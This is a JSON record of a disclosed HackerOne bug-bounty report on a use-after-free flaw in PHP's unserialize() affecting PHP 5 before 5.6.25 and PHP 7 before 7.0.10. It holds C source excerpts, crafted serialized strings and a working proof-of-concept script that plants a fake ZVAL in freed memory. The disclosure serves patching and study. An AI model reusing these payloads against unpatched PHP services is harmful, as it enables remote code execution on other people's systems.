{"id":159948,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk5NDg=","url":"https://hackerone.com/reports/159948","title":"Use After Free Vulnerability in unserialize()","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-17T06:46:10.927Z","submitted_at":"2016-08-17T06:46:10.927Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ryat","url":"/ryat","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYBTYHVYS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043643Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDaKSTb3EChMgDTnysheqj5DhaFkWfkkLg9bprhKLUhsAiB3C00GsGWPJ6DuGLnGT1QsFSaZNKPdgtEXvXm4QoYLsiq0AwhUEAEaDDAxMzYxOTI3NDg0OSIMAKVqIapKAKzPexnZKpEDp%2BNLAgbgUlhwrBi93XL5W8aXKcuP8OoU9PT5BjU3pGUUI3g8Hu%2F4mjuBIaaRGbLvV8UJpkO9TBUEHIaEDIs8rZ0mDIch3ncHlvNBW0BE%2FAMSLnWUINOrehikB0g2I0AasjVirqQ%2Fy2nzZDpofkxR%2FnfplnvAu337WSH5xyBgStfPxaD3qFE2SJgAQ6%2F8CsellltNw75POpRTlwBIeEZNjx3vJt1S9NN9jBHfQDYE%2FG0RZztV8Ec04hd%2BavbhCYzWtNl5pM8XtLOu7eDGWx2LHgHrrw0sNu7KMo%2Fp9Ti6b5H%2BlVa7TqU3NHJAcKPLuXNKPToWZYkFz45uFMB4g49BETD5Qseg7cz1z3ASfisMuXItKhc3Wmk28p7pggGcPnQTY7dJJ1LOUwWwHH69oX3qS2kKv%2BRk5swcc6rM4X8l2IXKvY3TS3Pd9kLaOdn5k2lcjiOZ0A2fpyl1be4XYY5v65Yow%2B53d7KYx2VAJ12oxjuILMh8DCI4mZ34lyPZeYXi0qlROqXDnv%2BzvnFHwIc8bjwwzrKq%2FwU67AFH0q5LeEdp6jxUg8gumwG55ojw09a8k8VkzxfdxIdWlGrCsAnv14Smo%2FTwIgFKRYc60KggUSXjAAOqVWkA5PD1%2BbOiqWpsghnC0p4DGK9tO3b4L0fZDKknZWHAzHsgOhycQDfPnrOZ6Cd00JV3ty2KQPAz2OXd%2BmldNq%2BOnR0lQXMZ8pOk4qqZMoDjQJnqG0TJup6wH%2FAuy9Ul6b9OZxeVGUeTP1hXpi7GP86nRctZDdbWYqP0KLrV7tO537fAinbfxIHlQMC0gJCGfRBDPpP4lR4OSKuI%2BEjkVpBN%2B1%2FaR3XrMykMIrZSkbFlcA%3D%3D\u0026X-Amz-Signature=e920b27e2ebdece059ea6a4598a61c6943a52825c55a537fd129e940b5f4b607"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-13T11:09:11.314Z","bug_reporter_agreed_on_going_public_at":"2019-10-13T11:09:11.251Z","team_member_agreed_on_going_public_at":"2019-10-13T09:32:56.413Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"bug report at: https://bugs.php.net/bug.php?id=70436\nfix commit at: https://github.com/php/php-src/commit/95d09e4b5e6b84f8340efe03e8e2f9c1380228db\n\n#Use After Free Vulnerability in unserialize()\n\nTaoguang Chen \u003c[@chtg57](https://twitter.com/chtg57)\u003e - Write Date: 2015.9.6 - Release Date: 2016.8.18\n\n\u003e A use-after-free vulnerability was discovered in unserialize() with customized serializing class that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\n\nAffected Versions\n------------\nAffected is PHP 5 \u003c 5.6.25\nAffected is PHP 7 \u003c 7.0.10\n\nCredits\n------------\nThis vulnerability was disclosed by Taoguang Chen.\n\nDescription\n------------\n```\nstatic inline int object_custom(UNSERIALIZE_PARAMETER, zend_class_entry *ce)\n{\n\t...\n\t} else if (ce-\u003eunserialize(rval, ce, (const unsigned char*)*p, datalen, (zend_unserialize_data *)var_hash TSRMLS_CC) != SUCCESS) {\n\t\treturn 0;\n\t}\n```\n\nPHP provides an interface for customized serializing, the basic usage given in the PHP manual such as the following code:\n\n```\n\u003c?php\n\nclass obj implements Serializable {\n\tvar $data;\n\tfunction serialize() {\n\t\treturn serialize($this-\u003edata);\n\t}\n\tfunction unserialize($data) {\n\t\t$this-\u003edata = unserialize($data);\n\t}\n}\n\n?\u003e\n```\n\nBut using the interface may cause some security issues.\n\n```\nPHP_FUNCTION(unserialize)\n{\n\t...\n\tif (!php_var_unserialize(\u0026return_value, \u0026p, p + buf_len, \u0026var_hash TSRMLS_CC)) {\n\t\tPHP_VAR_UNSERIALIZE_DESTROY(var_hash);\n\t\tzval_dtor(return_value);\n\t\tif (!EG(exception)) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Error at offset %ld of %d bytes\", (long)((char*)p - buf), buf_len);\n\t\t}\n\t\tRETURN_FALSE;\n\t}\n```\n\nIf the php_var_unserialize() call fails, the ZVAL `return_value` will be freed via zval_dtor(), then the ZVAL will be setted into a boolean-type ZVAL that value as FALSE, and the ZVAL will be still stored in an customized serializing object as its properties, such as the following code:\n\n```\n\u003c?php\n\nunserialize('C:3:\"obj\":4:{ryat}');\n\n?\u003e\n```\n\nAgain, the object can be freed and setted as FALSE when next php_var_unserialize() call fails in during customized serializing. This means that the object and its properties will be destroyed. This also means that in the previous php_var_unserialize() call fails of the ZVAL will be freed. However during deserialization will still allow to use R: or r: to set references to that already freed memory, such as the following code:\n\n```\n\u003c?php\n\nunserialize('a:2:{i:0;C:3:\"obj\":17:{C:3:\"obj\":3:{ryat}i:1;R:4;}');\n\n?\u003e\n```\n\nThis will result in use-after-free and execute arbitrary code remotely.\n\nProof of Concept Exploit\n------------\nThe PoC works on standard macOS installation of PHP 5 series.\n```\n\u003c?php\n\nclass obj implements Serializable {\n\tvar $data;\n\tfunction serialize() {\n\t\treturn serialize($this-\u003edata);\n\t}\n\tfunction unserialize($data) {\n\t\t$this-\u003edata = unserialize($data);\n\t}\n}\n\n$fakezval = ptr2str(1122334455);\n$fakezval .= ptr2str(0);\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\n$fakezval .= \"\\x01\";\n$fakezval .= \"\\x00\";\n$fakezval .= \"\\x00\\x00\";\n\n$inner = 'C:3:\"obj\":3:{ryat';\n$exploit = 'a:4:{i:0;i:1;i:1;C:3:\"obj\":'.strlen($inner).':{'.$inner.'}i:2;s:'.strlen($fakezval).':\"'.$fakezval.'\";i:3;R:5;}';\n$data = unserialize($exploit);\nvar_dump($data[3]);\n\nfunction ptr2str($ptr)\n{\n\t$out = '';\n\t\n\tfor ($i = 0; $i \u003c 8; $i++) {\n\t\t$out .= chr($ptr \u0026 0xff);\n\t\t$ptr \u003e\u003e= 8;\n\t}\n\t\n\treturn $out;\n}\n\n?\u003e\n```\n\nTest the PoC on the command line:\n```\n$ php uafpoc.php\nint(1122334455)  \u003c=== Created integer-type fake ZVAL\n```\n\nSo an attacker can control the memory and create fake ZVAL, and an array-type or object-type fake ZVAL will result in code execution easily, it has been demonstrated many times before.","vulnerability_information_html":"\u003cp\u003ebug report at: \u003ca title=\"https://bugs.php.net/bug.php?id=70436\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D70436\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=70436\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nfix commit at: \u003ca title=\"https://github.com/php/php-src/commit/95d09e4b5e6b84f8340efe03e8e2f9c1380228db\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F95d09e4b5e6b84f8340efe03e8e2f9c1380228db\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/php/php-src/commit/95d09e4b5e6b84f8340efe03e8e2f9c1380228db\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"use-after-free-vulnerability-in-unserialize\"\u003eUse After Free Vulnerability in unserialize()\u003c/h1\u003e\n\n\u003cp\u003eTaoguang Chen \u0026lt;\u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fchtg57\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@chtg57\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026gt; - Write Date: 2015.9.6 - Release Date: 2016.8.18\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eA use-after-free vulnerability was discovered in unserialize() with customized serializing class that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"affected-versions\"\u003eAffected Versions\u003c/h2\u003e\n\n\u003cp\u003eAffected is PHP 5 \u0026lt; 5.6.25\u003cbr\u003e\nAffected is PHP 7 \u0026lt; 7.0.10\u003c/p\u003e\n\n\u003ch2 id=\"credits\"\u003eCredits\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability was disclosed by Taoguang Chen.\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003estatic inline int object_custom(UNSERIALIZE_PARAMETER, zend_class_entry *ce)\n{\n    ...\n    } else if (ce-\u0026gt;unserialize(rval, ce, (const unsigned char*)*p, datalen, (zend_unserialize_data *)var_hash TSRMLS_CC) != SUCCESS) {\n        return 0;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePHP provides an interface for customized serializing, the basic usage given in the PHP manual such as the following code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eobj\u003c/span\u003e \u003cspan class=\"k\"\u003eimplements\u003c/span\u003e \u003cspan class=\"nx\"\u003eSerializable\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nb\"\u003eserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut using the interface may cause some security issues.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePHP_FUNCTION(unserialize)\n{\n    ...\n    if (!php_var_unserialize(\u0026amp;return_value, \u0026amp;p, p + buf_len, \u0026amp;var_hash TSRMLS_CC)) {\n        PHP_VAR_UNSERIALIZE_DESTROY(var_hash);\n        zval_dtor(return_value);\n        if (!EG(exception)) {\n            php_error_docref(NULL TSRMLS_CC, E_NOTICE, \u0026quot;Error at offset %ld of %d bytes\u0026quot;, (long)((char*)p - buf), buf_len);\n        }\n        RETURN_FALSE;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the php_var_unserialize() call fails, the ZVAL \u003ccode\u003ereturn_value\u003c/code\u003e will be freed via zval_dtor(), then the ZVAL will be setted into a boolean-type ZVAL that value as FALSE, and the ZVAL will be still stored in an customized serializing object as its properties, such as the following code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;C:3:\u0026quot;obj\u0026quot;:4:{ryat}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAgain, the object can be freed and setted as FALSE when next php_var_unserialize() call fails in during customized serializing. This means that the object and its properties will be destroyed. This also means that in the previous php_var_unserialize() call fails of the ZVAL will be freed. However during deserialization will still allow to use R: or r: to set references to that already freed memory, such as the following code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;a:2:{i:0;C:3:\u0026quot;obj\u0026quot;:17:{C:3:\u0026quot;obj\u0026quot;:3:{ryat}i:1;R:4;}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis will result in use-after-free and execute arbitrary code remotely.\u003c/p\u003e\n\n\u003ch2 id=\"proof-of-concept-exploit\"\u003eProof of Concept Exploit\u003c/h2\u003e\n\n\u003cp\u003eThe PoC works on standard macOS installation of PHP 5 series.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eobj\u003c/span\u003e \u003cspan class=\"k\"\u003eimplements\u003c/span\u003e \u003cspan class=\"nx\"\u003eSerializable\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nb\"\u003eserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$fakezval\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eptr2str\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1122334455\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$fakezval\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"nx\"\u003eptr2str\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$fakezval\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x00\\x00\\x00\\x00\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$fakezval\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x01\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$fakezval\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x00\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$fakezval\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x00\\x00\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$inner\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;C:3:\u0026quot;obj\u0026quot;:3:{ryat\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$exploit\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;a:4:{i:0;i:1;i:1;C:3:\u0026quot;obj\u0026quot;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$inner\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:{\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$inner\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;}i:2;s:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$fakezval\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026quot;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$fakezval\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026quot;;i:3;R:5;}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eunserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$exploit\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003evar_dump\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eptr2str\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$out\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$out\u003c/span\u003e \u003cspan class=\"o\"\u003e.=\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xff\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTest the PoC on the command line:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ php uafpoc.php\nint(1122334455)  \u0026lt;=== Created integer-type fake ZVAL\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo an attacker can control the memory and create fake ZVAL, and an array-type or object-type fake ZVAL will result in code execution easily, it has been demonstrated many times before.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:32:56.500Z","allow_singular_disclosure_after":-35665426.86846078,"singular_disclosure_allowed":true,"vote_count":4,"voters":["ryat","smodnix","dyabla","unihorn"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1205716,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-20T04:21:30.666Z","updated_at":"2016-09-20T04:21:30.666Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"ryat","url":"/ryat"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1205717,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-20T04:21:34.785Z","updated_at":"2016-09-20T04:21:34.785Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP 